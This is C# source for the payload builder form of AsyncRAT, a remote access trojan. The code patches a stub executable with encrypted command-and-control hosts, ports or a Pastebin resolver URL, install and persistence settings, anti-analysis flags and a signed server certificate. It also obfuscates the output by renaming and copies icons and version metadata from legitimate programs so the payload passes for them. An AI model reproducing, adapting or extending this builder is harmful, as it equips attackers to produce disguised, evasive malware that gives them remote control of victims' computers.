using System;
using System.Windows.Forms;
using Server.Helper;
using System.Text;
using System.Security.Cryptography;
using Server.Algorithm;
using System.Security.Cryptography.X509Certificates;
using System.Collections.Generic;
using Vestris.ResourceLib;
using dnlib.DotNet;
using System.IO;
using System.Linq;
using System.Drawing;
using dnlib.DotNet.Emit;
using Server.RenamingObfuscation;
using System.Threading.Tasks;
using System.Diagnostics;
using Toolbelt.Drawing;

namespace Server.Forms
{
    public partial class FormBuilder : Form
    {
        public FormBuilder()
        {
            InitializeComponent();
        }

        private bool TryNormalizePort(string value, out string normalizedPort)
        {
            normalizedPort = string.Empty;
            if (string.IsNullOrWhiteSpace(value)) return false;
            if (!int.TryParse(value.Trim(), out int parsedPort)) return false;
            if (parsedPort < 1 || parsedPort > 65535) return false;
            normalizedPort = parsedPort.ToString();
            return true;
        }

        private bool TryNormalizeHost(string value, out string normalizedHost)
        {
            normalizedHost = value?.Trim().Replace(" ", "");
            if (string.IsNullOrWhiteSpace(normalizedHost)) return false;
            return Uri.CheckHostName(normalizedHost) != UriHostNameType.Unknown;
        }

        private bool ValidateManualConnectionEntries(bool showMessages = true)
        {
            if (listBoxIP.Items.Count == 0)
            {
                if (showMessages)
                    MessageBox.Show("Add at least one host/IP before building.", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return false;
            }
            if (listBoxPort.Items.Count == 0)
            {
                if (showMessages)
                    MessageBox.Show("Add at least one port before building.", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return false;
            }

            foreach (string port in listBoxPort.Items)
            {
                if (!TryNormalizePort(port, out _))
                {
                    if (showMessages)
                        MessageBox.Show("Ports must be numeric and between 1-65535.", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return false;
                }
            }

            foreach (string host in listBoxIP.Items)
            {
                if (!TryNormalizeHost(host, out _))
                {
                    if (showMessages)
                        MessageBox.Show("Enter valid host/IP entries (domain, IPv4, or IPv6).", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return false;
                }
            }

            return true;
        }

        private bool ValidatePastebinUrl(bool showMessages = true)
        {
            txtPastebin.Text = txtPastebin.Text.Trim();
            if (string.IsNullOrWhiteSpace(txtPastebin.Text))
            {
                if (showMessages)
                    MessageBox.Show("Pastebin URL cannot be empty when Pastebin mode is enabled.", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return false;
            }
            if (!Uri.TryCreate(txtPastebin.Text, UriKind.Absolute, out Uri pasteUri) || (pasteUri.Scheme != Uri.UriSchemeHttp && pasteUri.Scheme != Uri.UriSchemeHttps))
            {
                if (showMessages)
                    MessageBox.Show("Enter a valid HTTP/HTTPS Pastebin raw URL (e.g. https://pastebin.com/raw/...).", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return false;
            }
            return true;
        }

        private void UpdatePrerequisiteLabels(bool hasCertificate, bool hasStub)
        {
            lblCertificateStatus.Text = hasCertificate ? "Certificate: found (ServerCertificate.p12)" : "Certificate: missing. Run server once in Release.";
            lblCertificateStatus.ForeColor = hasCertificate ? Color.ForestGreen : Color.Firebrick;
            lblStubStatus.Text = hasStub ? "Stub: found (Stub/Stub.exe)" : "Stub: missing. Restore stub before building.";
            lblStubStatus.ForeColor = hasStub ? Color.ForestGreen : Color.Firebrick;
        }

        private void UpdateConnectionStatusLabels()
        {
            if (chkPastebin.Checked)
            {
                bool pasteValid = ValidatePastebinUrl(false);
                lblHostStatus.Text = "Hosts: provided via Pastebin";
                lblHostStatus.ForeColor = pasteValid ? Color.ForestGreen : Color.DarkOrange;
                lblPortStatus.Text = "Ports: provided via Pastebin";
                lblPortStatus.ForeColor = pasteValid ? Color.ForestGreen : Color.DarkOrange;
                lblPastebinStatus.Text = pasteValid ? "Pastebin: OK (raw HTTP/HTTPS host:port1:port2)" : "Pastebin: enter raw HTTP/HTTPS URL (host:port1:port2)";
                lblPastebinStatus.ForeColor = pasteValid ? Color.ForestGreen : Color.Firebrick;
            }
            else
            {
                bool hostsOk = listBoxIP.Items.Count > 0;
                bool portsOk = listBoxPort.Items.Count > 0;
                bool hostsValid = hostsOk;
                bool portsValid = portsOk;
                if (hostsOk)
                {
                    foreach (string host in listBoxIP.Items)
                    {
                        if (!TryNormalizeHost(host, out _))
                        {
                            hostsValid = false;
                            break;
                        }
                    }
                }
                if (portsOk)
                {
                    foreach (string port in listBoxPort.Items)
                    {
                        if (!TryNormalizePort(port, out _))
                        {
                            portsValid = false;
                            break;
                        }
                    }
                }
                lblHostStatus.Text = hostsOk ? $"{listBoxIP.Items.Count} host(s) ready" : "Add at least one host";
                lblHostStatus.ForeColor = hostsOk && hostsValid ? Color.ForestGreen : Color.Firebrick;
                lblPortStatus.Text = portsOk ? $"{listBoxPort.Items.Count} port(s) ready" : "Add at least one port";
                lblPortStatus.ForeColor = portsOk && portsValid ? Color.ForestGreen : Color.Firebrick;
                lblPastebinStatus.Text = "Pastebin: disabled (manual host/port)";
                lblPastebinStatus.ForeColor = Color.Gray;
            }
        }

        private void UpdateBuildButtonState()
        {
            bool hasCertificate = File.Exists(Settings.CertificatePath);
            bool hasStub = File.Exists(@"Stub\Stub.exe");
            bool connectionValid = chkPastebin.Checked ? ValidatePastebinUrl(false) : ValidateManualConnectionEntries(false);
            btnBuild.Enabled = connectionValid && hasCertificate && hasStub;
            UpdatePrerequisiteLabels(hasCertificate, hasStub);
            UpdateConnectionStatusLabels();
        }

        private void RefreshUiState()
        {
            UpdateBuildButtonState();
        }

        private void TabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            RefreshUiState();
        }

        private void SaveSettings()
        {
            try
            {
                List<string> Pstring = new List<string>();
                foreach (string port in listBoxPort.Items)
                {
                    Pstring.Add(port);
                }
                Properties.Settings.Default.Ports = string.Join(",", Pstring);

                List<string> IPstring = new List<string>();
                foreach (string ip in listBoxIP.Items)
                {
                    IPstring.Add(ip);
                }
                Properties.Settings.Default.IP = string.Join(",", IPstring);

                Properties.Settings.Default.Save();
            }
            catch { }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                checkBox1.Text = "ON";
                textFilename.Enabled = true;
                comboBoxFolder.Enabled = true;
            }
            else
            {
                checkBox1.Text = "OFF";
                textFilename.Enabled = false;
                comboBoxFolder.Enabled = false;
            }
        }

        private void Builder_Load(object sender, EventArgs e)
        {
            comboBoxFolder.SelectedIndex = 0;
            HashSet<string> seenPorts = new HashSet<string>();
            HashSet<string> seenHosts = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            if (Properties.Settings.Default.IP.Length == 0)
            {
                listBoxIP.Items.Add("127.0.0.1");
                seenHosts.Add("127.0.0.1");
            }

            if (Properties.Settings.Default.Pastebin.Length == 0)
                txtPastebin.Text = "https://pastebin.com/raw/s14cUU5G";

            try
            {
                string[] ports = Properties.Settings.Default.Ports.Split(new[] { "," }, StringSplitOptions.None);
                foreach (string item in ports)
                {
                    if (TryNormalizePort(item, out string normalizedPort) && seenPorts.Add(normalizedPort))
                        listBoxPort.Items.Add(normalizedPort);
                }
            }
            catch { }
            if (listBoxPort.Items.Count == 0)
            {
                listBoxPort.Items.Add("6606");
                seenPorts.Add("6606");
            }

            try
            {
                string[] ip = Properties.Settings.Default.IP.Split(new[] { "," }, StringSplitOptions.None);
                foreach (string item in ip)
                {
                    if (TryNormalizeHost(item, out string normalizedHost) && seenHosts.Add(normalizedHost))
                        listBoxIP.Items.Add(normalizedHost);
                }
            }
            catch { }
            if (listBoxIP.Items.Count == 0)
                listBoxIP.Items.Add("127.0.0.1");

            RefreshUiState();
        }


        private void CheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (chkPastebin.Checked)
            {
                txtPastebin.Enabled = true;
                textIP.Enabled = false;
                textPort.Enabled = false;
                listBoxIP.Enabled = false;
                listBoxPort.Enabled = false;
                btnAddIP.Enabled = false;
                btnAddPort.Enabled = false;
                btnRemoveIP.Enabled = false;
                btnRemovePort.Enabled = false;
            }
            else
            {
                txtPastebin.Enabled = false;
                textIP.Enabled = true;
                textPort.Enabled = true;
                listBoxIP.Enabled = true;
                listBoxPort.Enabled = true;
                btnAddIP.Enabled = true;
                btnAddPort.Enabled = true;
                btnRemoveIP.Enabled = true;
                btnRemovePort.Enabled = true;
            }

            RefreshUiState();
        }

        private void BtnRemovePort_Click(object sender, EventArgs e)
        {
            if (listBoxPort.SelectedItems.Count == 1)
            {
                listBoxPort.Items.Remove(listBoxPort.SelectedItem);
            }
            RefreshUiState();
        }

        private void BtnAddPort_Click(object sender, EventArgs e)
        {
            if (!TryNormalizePort(textPort.Text, out string normalizedPort))
            {
                MessageBox.Show("Enter a valid port number between 1 and 65535.", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            foreach (string item in listBoxPort.Items)
            {
                if (item.Equals(normalizedPort))
                    return;
            }
            listBoxPort.Items.Add(normalizedPort);
            textPort.Clear();
            RefreshUiState();
        }

        private void BtnRemoveIP_Click(object sender, EventArgs e)
        {
            if (listBoxIP.SelectedItems.Count == 1)
            {
                listBoxIP.Items.Remove(listBoxIP.SelectedItem);
            }
            RefreshUiState();
        }

        private void BtnAddIP_Click(object sender, EventArgs e)
        {
            if (!TryNormalizeHost(textIP.Text, out string normalizedHost))
            {
                MessageBox.Show("Enter a valid host/IP (domain, IPv4, or IPv6).", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            foreach (string item in listBoxIP.Items)
            {
                if (item.Equals(normalizedHost, StringComparison.OrdinalIgnoreCase))
                    return;
            }
            listBoxIP.Items.Add(normalizedHost);
            textIP.Clear();
            RefreshUiState();
        }

        private async void BtnBuild_Click(object sender, EventArgs e)
        {
            if (!chkPastebin.Checked)
            {
                if (!ValidateManualConnectionEntries()) return;
            }
            else
            {
                if (!ValidatePastebinUrl()) return;
            }

            if (!File.Exists(Settings.CertificatePath))
            {
                MessageBox.Show("ServerCertificate.p12 is missing. Start the server once (Release) or use the Ports dialog to generate the certificate, then rebuild.", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (checkBox1.Checked)
            {
                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
            }

            if (string.IsNullOrWhiteSpace(txtGroup.Text)) txtGroup.Text = "Default";

            if (chkPastebin.Checked && string.IsNullOrWhiteSpace(txtPastebin.Text)) return;

            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = Helper.Methods.GetRandomString(12);

            if (!File.Exists(@"Stub\Stub.exe"))
            {
                MessageBox.Show("Stub/Stub.exe is missing. Restore the stub files before building.", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            ModuleDefMD asmDef = null;
            try
            {
                using (asmDef = ModuleDefMD.Load(@"Stub/Stub.exe"))
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog1.InitialDirectory = Application.StartupPath;
                    saveFileDialog1.OverwritePrompt = false;
                    saveFileDialog1.FileName = "AsyncClient";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        btnBuild.Enabled = false;
                        WriteSettings(asmDef, saveFileDialog1.FileName);
                        if (chkObfu.Checked)
                        {
                            //EncryptString.DoEncrypt(asmDef);
                            await Task.Run(() =>
                            {
                                Renaming.DoRenaming(asmDef);
                            });
                        }
                        asmDef.Write(saveFileDialog1.FileName);
                        asmDef.Dispose();
                        if (btnAssembly.Checked)
                        {
                            WriteAssembly(saveFileDialog1.FileName);
                        }
                        if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
                        {
                            IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
                        }
                        MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        SaveSettings();
                        this.Close();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                asmDef?.Dispose();
                btnBuild.Enabled = true;

            }
        }

        private void WriteAssembly(string filename)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filename);

                versionResource.FileVersion = txtFileVersion.Text;
                versionResource.ProductVersion = txtProductVersion.Text;
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = txtProduct.Text;
                stringFileInfo["FileDescription"] = txtDescription.Text;
                stringFileInfo["CompanyName"] = txtCompany.Text;
                stringFileInfo["LegalCopyright"] = txtCopyright.Text;
                stringFileInfo["LegalTrademarks"] = txtTrademarks.Text;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = txtOriginalFilename.Text;
                stringFileInfo["OriginalFilename"] = txtOriginalFilename.Text;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;

                versionResource.SaveTo(filename);
            }
            catch (Exception ex)
            {
                throw new ArgumentException("Assembly: " + ex.Message);
            }
        }

        private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
        {
            if (btnAssembly.Checked)
            {
                btnClone.Enabled = true;
                txtProduct.Enabled = true;
                txtDescription.Enabled = true;
                txtCompany.Enabled = true;
                txtCopyright.Enabled = true;
                txtTrademarks.Enabled = true;
                txtOriginalFilename.Enabled = true;
                txtOriginalFilename.Enabled = true;
                txtProductVersion.Enabled = true;
                txtFileVersion.Enabled = true;
            }
            else
            {
                btnClone.Enabled = false;
                txtProduct.Enabled = false;
                txtDescription.Enabled = false;
                txtCompany.Enabled = false;
                txtCopyright.Enabled = false;
                txtTrademarks.Enabled = false;
                txtOriginalFilename.Enabled = false;
                txtOriginalFilename.Enabled = false;
                txtProductVersion.Enabled = false;
                txtFileVersion.Enabled = false;
            }
        }

        private void ChkIcon_CheckedChanged(object sender, EventArgs e)
        {
            if (chkIcon.Checked)
            {
                txtIcon.Enabled = true;
                btnIcon.Enabled = true;
            }
            else
            {
                txtIcon.Enabled = false;
                btnIcon.Enabled = false;
            }
        }

        private void BtnIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Choose Icon";
                ofd.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    if (ofd.FileName.ToLower().EndsWith(".exe"))
                    {
                        string ico = GetIcon(ofd.FileName);
                        txtIcon.Text = ico;
                        picIcon.ImageLocation = ico;
                    }
                    else
                    {
                        txtIcon.Text = ofd.FileName;
                        picIcon.ImageLocation = ofd.FileName;
                    }
                }
            }
        }

        private string GetIcon(string path)
        {
            try
            {
                string tempFile = Path.GetTempFileName() + ".ico";
                using (FileStream fs = new FileStream(tempFile, FileMode.Create))
                {
                    IconExtractor.Extract1stIconTo(path, fs);
                }
                return tempFile;
            }
            catch { }
            return "";
        }

        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                var key = Methods.GetRandomString(32);
                var aes = new Aes256(key);
                var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
                var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert));
                byte[] signature;
                using (var csp = (RSACryptoServiceProvider)caCertificate.PrivateKey)
                {
                    var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                    signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
                }

                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "Settings")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "%Ports%")
                                    {
                                        if (chkPastebin.Enabled && chkPastebin.Checked)
                                        {
                                            method.Body.Instructions[i].Operand = aes.Encrypt("null");
                                        }
                                        else
                                        {
                                            List<string> LString = new List<string>();
                                            foreach (string port in listBoxPort.Items)
                                            {
                                                if (TryNormalizePort(port, out string normalizedPort) && !LString.Contains(normalizedPort))
                                                    LString.Add(normalizedPort);
                                            }
                                            method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
                                        }
                                    }

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Hosts%")
                                    {
                                        if (chkPastebin.Enabled && chkPastebin.Checked)
                                        {
                                            method.Body.Instructions[i].Operand = aes.Encrypt("null");
                                        }
                                        else
                                        {
                                            List<string> LString = new List<string>();
                                            foreach (string ip in listBoxIP.Items)
                                            {
                                                if (TryNormalizeHost(ip, out string normalizedHost) && !LString.Contains(normalizedHost))
                                                    LString.Add(normalizedHost);
                                            }
                                            method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
                                        }
                                    }

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Install%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(checkBox1.Checked.ToString().ToLower());

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Folder%")
                                        method.Body.Instructions[i].Operand = comboBoxFolder.Text;


                                    if (method.Body.Instructions[i].Operand.ToString() == "%File%")
                                        method.Body.Instructions[i].Operand = textFilename.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("AsyncRAT ", ""));

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
                                        method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));

                                    if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
                                        if (string.IsNullOrWhiteSpace(txtMutex.Text))
                                            method.Body.Instructions[i].Operand = Helper.Methods.GetRandomString(12);
                                        else
                                            method.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(chkAnti.Checked.ToString().ToLower());

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Certificate%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));

                                    if (method.Body.Instructions[i].Operand.ToString() == "%BDOS%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(chkBdos.Checked.ToString().ToLower());

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Pastebin%")
                                        if (chkPastebin.Checked)
                                            method.Body.Instructions[i].Operand = aes.Encrypt(txtPastebin.Text);
                                        else
                                            method.Body.Instructions[i].Operand = aes.Encrypt("null");

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Delay%")
                                        method.Body.Instructions[i].Operand = numDelay.Value.ToString();

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
                                        method.Body.Instructions[i].Operand = aes.Encrypt(txtGroup.Text);
                                }
                            }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings: " + ex.Message);
            }
        }

        private void TextPort_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
            {
                e.Handled = true;
            }
        }

        private void TxtPastebin_TextChanged(object sender, EventArgs e)
        {
            RefreshUiState();
        }

        private void BtnClone_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                    txtOriginalFilename.Text = fileVersionInfo.InternalName ?? string.Empty;
                    txtDescription.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    txtCompany.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    txtProduct.Text = fileVersionInfo.ProductName ?? string.Empty;
                    txtCopyright.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    txtTrademarks.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;

                    var version = fileVersionInfo.FileMajorPart;
                    txtFileVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                    txtProductVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                }
            }
        }

        private void txtMutex_MouseEnter(object sender, EventArgs e)
        {
            txtMutex.Text = Helper.Methods.GetRandomString(12);
        }
    }
}
